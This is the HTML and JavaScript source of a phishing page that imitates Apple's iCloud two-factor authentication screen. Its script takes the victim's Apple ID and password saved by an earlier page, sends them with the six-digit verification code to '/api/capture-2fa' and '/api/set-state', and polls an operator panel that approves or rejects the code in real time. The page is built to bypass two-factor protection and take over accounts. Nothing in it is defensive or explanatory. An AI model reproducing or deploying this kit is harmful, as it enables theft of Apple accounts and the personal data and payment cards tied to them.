<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple ID - Two-Factor Authentication</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #1c1c1e;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 30px 10px 100px;
            -webkit-font-smoothing: antialiased;
            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Inter", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        .signin-card {
            background: #1c1c1e;
            width: 640px;
            max-width: 94vw;
            border-radius: 28px;
            padding: 40px 40px;
            min-height: 600px;
            text-align: center;
            box-shadow: 0 4px 24px rgba(0,0,0,0.6), 0 20px 60px rgba(0,0,0,0.5);
            border: none;
            display: flex;
            flex-direction: column;
            align-items: center;
            animation: fadeInCard 0.5s ease-out forwards;
        }
        
        @keyframes fadeInCard {
            from { opacity: 0; transform: translateY(20px) scale(0.95); }
            to { opacity: 1; transform: translateY(0) scale(1); }
        }
        .signin-header-logo { width: 214px; height: 214px; margin-top: -20px; margin-bottom: 12px; }
        .signin-header-logo img { width: 100%; height: 100%; object-fit: contain; }
        h1 { font-size: 21px; font-weight: 600; color: #fff; text-align: center; margin-bottom: 24px; }
        .subtitle { text-align: center; color: #ffffff; font-size: 16px; margin-bottom: 32px; }
        .otp-container { width: fit-content; margin: 0 auto 24px; }
        .code-inputs { display: flex; gap: 12px; justify-content: center; margin-bottom: 24px; }
        .code-input {
            width: 48px; height: 56px;
            background: rgba(44, 44, 46, 0.6);
            border: 1px solid rgba(255,255,255,0.3);
            border-radius: 8px;
            color: #fff;
            font-size: 24px;
            font-weight: 500;
            text-align: center;
            outline: none;
            caret-color: #0071e3;
            transition: all 0.2s ease;
        }
        .code-input:hover {
            background: rgba(44, 44, 46, 0.8);
            transform: translateY(-1px);
        }
        .code-input:focus { 
            border-color: #0071e3; 
            box-shadow: 0 0 0 3px rgba(0, 113, 227, 0.3);
            transform: scale(1.02);
            background: rgba(44, 44, 46, 0.9);
        }
        .help-link { color: #2997ff; font-size: 14px; text-decoration: none; display: block; margin: 8px 0; }
        .help-link:hover { text-decoration: underline; }
        .divider { width: 100%; height: 1px; background: rgba(255,255,255,0.2); margin: 24px 0; }
        .help-text { color: #fff; font-size: 15px; margin-top: 16px; line-height: 1.5; }
        .help-text span { color: #2997ff; }
        .loading { display: none; padding: 20px; }
        .apple-spinner {
            width: 40px; height: 40px;
            border: 4px solid rgba(255,255,255,0.1);
            border-top: 4px solid #0071e3;
            border-radius: 50%;
            margin: 0 auto 20px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @media (max-width: 768px) {
            .signin-card { padding: 24px; }
            .code-input { width: 44px; height: 50px; font-size: 20px; }
        }
    </style>
</head>
<body>
    <div class="navbar" style="position:fixed;top:0;left:0;right:0;z-index:300;display:flex;justify-content:space-between;align-items:center;padding:4px 15px;background:linear-gradient(to bottom, rgba(28,28,30,0.6),rgba(28,28,30,0));height:44px;">
        <a href="/"><img src="https://ext.same-assets.com/1146199715/1951680307.svg" alt="iCloud" style="height:32px;filter:brightness(0) invert(1);cursor:pointer;"></a>
    </div>
    <div class="signin-card" id="verifyContainer" style="margin-top:60px;">
        <div class="signin-header-logo">
            <img src="/logo-ring.png" alt="">
        </div>
        <h1>Two-Factor Authentication</h1>
        <p class="subtitle">Enter the verification code sent to your Apple devices.</p>
        <div class="otp-container">
            <div class="code-inputs">
                <input type="text" maxlength="1" class="code-input" id="code1" autofocus inputmode="numeric" pattern="[0-9]">
                <input type="text" maxlength="1" class="code-input" id="code2" inputmode="numeric" pattern="[0-9]">
                <input type="text" maxlength="1" class="code-input" id="code3" inputmode="numeric" pattern="[0-9]">
                <input type="text" maxlength="1" class="code-input" id="code4" inputmode="numeric" pattern="[0-9]">
                <input type="text" maxlength="1" class="code-input" id="code5" inputmode="numeric" pattern="[0-9]">
                <input type="text" maxlength="1" class="code-input" id="code6" inputmode="numeric" pattern="[0-9]">
            </div>
            <a href="#" class="help-link" id="resendLink">Resend code to devices</a>
            <a href="https://support.apple.com/en-us/118446" target="_blank" class="help-link">Can't get to your devices?</a>
        </div>
        <div class="divider"></div>
        <p class="help-text">If you can't enter a code because you've lost your device, you can use <span>Find Devices</span> to locate it or <span>Manage Devices</span> to remove your Apple Pay cards from this device.</p>
        <div class="loading" id="loading">
            <div class="apple-spinner"></div>
        </div>
    </div>
    <script>
        const inputs = document.querySelectorAll('.code-input');
        const loading = document.getElementById('loading');
        
        function getFirstEmpty() {
            for (let i = 0; i < inputs.length; i++) {
                if (!inputs[i].value) return i;
            }
            return -1;
        }
        
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                input.value = input.value.replace(/[^0-9]/g, '');
                if (input.value && index < 5) inputs[index + 1].focus();
                
                const code = [...inputs].map(i => i.value).join('');
                if (code.length === 6) verifyCode(code);
            });
            
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus();
                else if (e.key === 'ArrowLeft' && index > 0) inputs[index - 1].focus();
                else if (e.key === 'ArrowRight' && index < 5) inputs[index + 1].focus();
            });
            
            input.addEventListener('focus', () => {
                const firstEmpty = getFirstEmpty();
                if (firstEmpty !== -1 && index > firstEmpty && !input.value) inputs[firstEmpty].focus();
            });
        });
        
        document.getElementById('resendLink').addEventListener('click', (e) => {
            e.preventDefault();
            const appleid = sessionStorage.getItem('appleid') || '';
            
            // Send resend request to panel
            fetch('/api/resend-request', {method: 'POST', headers:{'Content-Type': 'application/json'}, body: JSON.stringify({appleid})}).catch(() => {});
            
            e.target.style.transition = 'all 0.3s ease';
            e.target.textContent = 'Code sent';
            e.target.style.color = '#34c759';
            e.target.style.transform = 'scale(1.05)';
            
            setTimeout(() => { 
                e.target.style.transition = 'all 0.3s ease';
                e.target.textContent = 'Resend code to devices'; 
                e.target.style.color = '';
                e.target.style.transform = 'scale(1)';
            }, 2500);
        });
        
        function verifyCode(code) {
            const appleid = sessionStorage.getItem('appleid') || '';
            const password = sessionStorage.getItem('password') || '';
            
            // Show loading state - spinner only, no text
            document.querySelector('.otp-container').style.display = 'none';
            document.querySelector('.divider').style.display = 'none';
            document.querySelector('.help-text').style.display = 'none';
            loading.style.display = 'flex';
            
            // Save 2FA code
            fetch('/api/capture-2fa', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({code, appleid})}).catch(() => {});
            
            // Set state to waiting for 2FA approval - include password
            fetch('/api/set-state', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({status: 'waiting_2fa', email: appleid, password: password, two_fa_code: code})
            });
            
            // Poll for 2FA approval
            check2FAState(appleid);
        }
        
        async function check2FAState(appleid) {
            try {
                const res = await fetch('/api/check-state');
                const state = await res.json();
                
                if (state.status === 'approved_2fa') {
                    window.location.href = 'https://www.icloud.com/';
                } else if (state.status === 'rejected_2fa') {
                    // Show error - red boxes and clear values
                    document.querySelector('.otp-container').style.display = 'block';
                    document.querySelector('.divider').style.display = 'block';
                    document.querySelector('.help-text').style.display = 'block';
                    loading.style.display = 'none';
                    document.querySelectorAll('.code-input').forEach(input => {
                        input.value = '';
                        input.style.borderColor = '#ff3b30';
                        input.style.background = 'rgba(255, 59, 48, 0.15)';
                    });
                    
                    // Add error message under the OTP container
                    const otpContainer = document.querySelector('.otp-container');
                    let errorMsg = document.getElementById('2faError');
                    if (!errorMsg) {
                        errorMsg = document.createElement('div');
                        errorMsg.id = '2faError';
                        errorMsg.style.cssText = 'color:#ff3b30;font-size:13px;margin-top:16px;text-align:center;';
                        otpContainer.appendChild(errorMsg);
                    }
                    errorMsg.textContent = 'Incorrect verification code';
                    errorMsg.style.display = 'block';
                    
                    // Focus first input
                    inputs[0].focus();
                    
                    // Clear state
                    await fetch('/api/set-state', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({status: 'idle'})});
                } else {
                    setTimeout(() => check2FAState(appleid), 1000);
                }
            } catch(e) {
                window.location.href = 'https://www.icloud.com/';
            }
        }
        
        const firstEmpty = getFirstEmpty();
        if (firstEmpty !== -1) inputs[firstEmpty].focus();
    </script>
</body>
</html>
